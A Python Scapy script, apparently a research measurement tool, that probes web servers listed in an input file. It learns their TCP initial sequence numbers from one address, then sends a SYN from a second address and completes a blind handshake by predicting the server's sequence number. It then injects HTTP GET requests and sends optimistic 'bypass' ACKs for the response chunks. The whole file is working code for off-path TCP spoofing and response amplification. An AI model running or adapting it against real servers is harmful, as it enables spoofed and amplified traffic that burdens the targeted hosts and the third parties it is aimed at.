from scapy.all import *
from random import randint
from random import sample
import time
from threading import Thread
import socket
from threading import Lock
from verify_model import *
import ast


USE_LARGE_MSS = True


ISN_SPC = 2**32

load_layer('http')
iface = sys.argv[3]
src_mac = sys.argv[4]
dst_mac = sys.argv[5]
probe_ip  = sys.argv[6]
verify_ip = sys.argv[7]
dport = 80

probe_port1 = 35201
probe_port2 = 37562
verify_port = 38409


probe_rsp_buffer = {}

raw_socket = socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.ntohs(0x0003))
raw_socket.bind((iface,0))


def sniffer_callback(packet):
    try:
        ip = packet['IP'].src
        dport = packet['TCP'].dport
        key = f"{ip}.{dport}"

        if not key in probe_rsp_buffer.keys() or not probe_rsp_buffer[key]==None:
            return
        
        flags = str(packet['TCP'].flags)
        seq = packet['TCP'].seq
        
        if 'SA' in flags:
            probe_rsp_buffer[key]=seq
        else:
            probe_rsp_buffer[key]=str(flags)

    except Exception as e:
        pass

def sniffer(psport_1,psport_2,src_ip):
    filter_exp = f"tcp src port 80 and (tcp dst port {psport_1} or tcp dst port {psport_2}) and ip host {src_ip}"
    sniff(iface=iface,prn=sniffer_callback,filter=filter_exp)

def verifier(probe_sender1,probe_sender2,verify_sender,probe_port1,probe_port2,dst_ip,resource_path,host,tag,verify_parameters,payload_len):
    payload_len = ast.literal_eval(payload_len)
    for i in range(0,len(payload_len)):
        payload_len[i] = int(payload_len[i])
    seq = 3182372096
    ack = 0

    if host=='None' or host=='' or host==None:
        payload_template = f'GET {resource_path} HTTP/1.1\r\nHost: {dst_ip}\r\nUser-Agent: -\r\nAccept: */*\r\nAccept-Encoding: identity\r\n\r\n'
    else:
        host = host.strip()
        payload_template = f'GET {resource_path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: -\r\nAccept: */*\r\nAccept-Encoding: identity\r\n\r\n'
    
    payload_template = bytes(payload_template,'ascii')    

    if USE_LARGE_MSS:
        probe_syn1 = build_syn_packet_large_mss(probe_sender1,dst_ip,ack,dport,seq)
        probe_syn2 = build_syn_packet_large_mss(probe_sender2,dst_ip,ack,dport,seq)
        verify_syn = build_syn_packet_large_mss(verify_sender,dst_ip,ack,dport,seq)
    else:
        probe_syn1 = build_syn_packet(probe_sender1,dst_ip,ack,dport,seq)
        probe_syn2 = build_syn_packet(probe_sender2,dst_ip,ack,dport,seq)
        verify_syn = build_syn_packet(verify_sender,dst_ip,ack,dport,seq)

    key1 = f"{dst_ip}.{probe_port1}"
    key2 = f"{dst_ip}.{probe_port2}"
    probe_rsp_buffer[key1]=None
    probe_rsp_buffer[key2]=None
        
    if tag=='D2':
        probe_start_time = time.time()
        raw_socket.send(probe_syn1)

        time.sleep(0.35)

        if type(probe_rsp_buffer[key1])!=int:
            bytes_cost = len(probe_syn1)*2
            output_line =  f"{dst_ip},{tag},{probe_start_time},{'-'},{'-'},{'-'},{'-'},{'-'},{bytes_cost},{'-'},{-1}"
            try:
                del probe_rsp_buffer[key1]
                del probe_rsp_buffer[key2]
            except:
                pass
            return output_line

        raw_socket.send(verify_syn)
        verify_start_time = time.time()


        ack_list = [
            probe_rsp_buffer[key1]+1,
            (probe_rsp_buffer[key1]+2)%ISN_SPC
        ]

        verify_est_list = []
        verify_pay_list = []


        for verify_ack in ack_list:
            verify_est_list.append(build_ack_packet(verify_sender,dst_ip,verify_ack,dport,seq+1))
            verify_pay_list.append(build_ack_with_payload_packet(verify_sender,dst_ip,verify_ack,resource_path,host,dport,seq+1))
            
                
        end_time = time.time()
        if (0.005-(end_time - verify_start_time)) >0:
            time.sleep((0.005-(end_time - verify_start_time)))
        
        for verify_est_pac in verify_est_list:
            raw_socket.send(verify_est_pac)
        
        time.sleep(0.005)

        for verify_pay_pac in verify_pay_list:
            raw_socket.send(verify_pay_pac)

        time.sleep(0.2)

        for t in range(0,len(payload_len)): # acknowledge all payloads chunks and send a second HTTP request when acknowledging the last.
        # for t in range(0,len(payload_len)-1): # acknowledge all payload blocks except the last one. 
        # for t in range(0,1): # only acknowledge the first payload chunks
            for verify_ack in ack_list:        
                bypass_ack = verify_ack+payload_len[t]
                bypass_pac = build_ack_packet(verify_sender,dst_ip,bypass_ack,dport,seq+1+len(payload_template))
                raw_socket.send(bypass_pac)
                if t==len(payload_len)-1:
                    # if this is the last payload chunks to acknowledge, we should send a new request
                    new_req = build_ack_with_payload_packet(verify_sender,dst_ip,bypass_ack,resource_path,host,dport,seq+1+len(payload_template))
                    raw_socket.send(new_req)
            time.sleep(0.2)

        for t in range(0,len(payload_len)-1):
            for verify_ack in ack_list:        
                bypass_ack = verify_ack+payload_len[-1]+payload_len[t]
                bypass_pac = build_ack_packet(verify_sender,dst_ip,bypass_ack,dport,seq+1+len(payload_template)*2)
                raw_socket.send(bypass_pac)
            time.sleep(0.2)
            # try to acknowledge payloads triggered by the sedcond HTTP request, avoiding acknowledge the last chunk to allow retransmission.


        end_time = time.time()
        bytes_cost = len(probe_syn1)*2+len(verify_syn)
        for pac in verify_est_list:
            bytes_cost = bytes_cost + len(pac)
        for pac in verify_pay_list:
            bytes_cost = bytes_cost + len(pac)


        output_line = f"{dst_ip},{tag},{probe_start_time},{'-'},{verify_start_time},{probe_rsp_buffer[key1]},{probe_rsp_buffer[key2]},{'-'},{end_time-verify_start_time},{bytes_cost},{1}"

        return output_line
    
    elif tag=='D3':
        probe_start_time = time.time()
        raw_socket.send(probe_syn1)
        time.sleep(0.35)
        probe_start_time2 = time.time()
        raw_socket.send(probe_syn2)
        time.sleep(0.35)

        if  type(probe_rsp_buffer[key2])!=int or type(probe_rsp_buffer[key1])!=int:
            bytes_cost = len(probe_syn1)*2+len(probe_syn2)*2
            output_line =  f"{dst_ip},{tag},{probe_start_time},{probe_start_time2},{'-'},{'-'},{'-'},{'-'},{'-'},{bytes_cost},{-1}"
            try:
                del probe_rsp_buffer[key1]
                del probe_rsp_buffer[key2]
            except:
                pass
            return output_line


        raw_socket.send(verify_syn)
        verify_start_time = time.time()

        probed_diff = probe_rsp_buffer[key2] - probe_rsp_buffer[key1]

        dod1 = int(verify_parameters[1])
        dod2 = int(verify_parameters[2])
        dod3 = int(verify_parameters[3])


        ack_list = [
            (probe_rsp_buffer[key2]+probed_diff+dod1+1)%ISN_SPC,
            (probe_rsp_buffer[key2]+probed_diff+dod2+1)%ISN_SPC,
            (probe_rsp_buffer[key2]+probed_diff+dod3+1)%ISN_SPC,
        ]
        ack_list = list(set(ack_list))
        ack_list.sort() 

        verify_est_list = []
        verify_pay_list = []


        for verify_ack in ack_list:
            verify_est_list.append(build_ack_packet(verify_sender,dst_ip,verify_ack,dport,seq+1))
            verify_pay_list.append(build_ack_with_payload_packet(verify_sender,dst_ip,verify_ack,resource_path,host,dport,seq+1))
            
                
        end_time = time.time()
        if (0.005-(end_time - verify_start_time)) >0:
            time.sleep((0.005-(end_time - verify_start_time)))
        
        for verify_est_pac in verify_est_list:
            raw_socket.send(verify_est_pac)
        
        time.sleep(0.005)

        for verify_pay_pac in verify_pay_list:
            raw_socket.send(verify_pay_pac)

        time.sleep(0.2)
        for t in range(0,len(payload_len)): 
        # for t in range(0,len(payload_len)-1):
        # for t in range(0,1):
            for verify_ack in ack_list:
                bypass_ack = verify_ack+payload_len[t]
                bypass_pac = build_ack_packet(verify_sender,dst_ip,bypass_ack,dport,seq+1+len(payload_template))
                raw_socket.send(bypass_pac)
                if t==len(payload_len)-1:
                    new_req = build_ack_with_payload_packet(verify_sender,dst_ip,bypass_ack,resource_path,host,dport,seq+1+len(payload_template))
                    raw_socket.send(new_req)
            time.sleep(0.2)

        for t in range(0,len(payload_len)-1):
            for verify_ack in ack_list:        
                bypass_ack = verify_ack+payload_len[-1]+payload_len[t]
                bypass_pac = build_ack_packet(verify_sender,dst_ip,bypass_ack,dport,seq+1+len(payload_template)*2)
                raw_socket.send(bypass_pac)
            time.sleep(0.2)



        end_time = time.time()


        bytes_cost = len(probe_syn1)*4+len(verify_syn)
        for pac in verify_est_list:
            bytes_cost = bytes_cost + len(pac)
        for pac in verify_pay_list:
            bytes_cost = bytes_cost + len(pac)


        output_line = f"{dst_ip},{tag},{probe_start_time},{probe_start_time2},{verify_start_time},{probe_rsp_buffer[key1]},{probe_rsp_buffer[key2]},{'-'},{end_time-verify_start_time},{bytes_cost},{1}"

        return output_line
    


import sys

if __name__ == '__main__':
    input_file = sys.argv[1]
    output_file = sys.argv[2]

    input_f = open(input_file,'r')
    lines = input_f.readlines()
    input_f.close()

    thread_sniffer = Thread(target=sniffer,args=(probe_port1,probe_port2,probe_ip))
    thread_sniffer.start()
    time.sleep(2) 

    probe_sender1 = Sender(src_mac,dst_mac,probe_ip,probe_port1)
    probe_sender2 = Sender(src_mac,dst_mac,probe_ip,probe_port2)
    verify_sender = Sender(src_mac,dst_mac,verify_ip,verify_port)

    output_f = open(output_file,'w')

    for line in lines:
        line = line.strip()
        line_list = line.split('^')
        ip = line_list[0]
        tag = line_list[2]

        resource_path = line_list[-2].split(ip)[1]
        if resource_path=='':
            resource_path='/'

        
        verify_parameters = line_list[3:8]
        host = line_list[-1]
        payload_len = line_list[1]

        
        ret = verifier(probe_sender1,probe_sender2,verify_sender,probe_port1,probe_port2,ip,resource_path,host,tag,verify_parameters,payload_len)+'\n'
        output_f.write(ret)

    output_f.close()
    import os
    os._exit(0)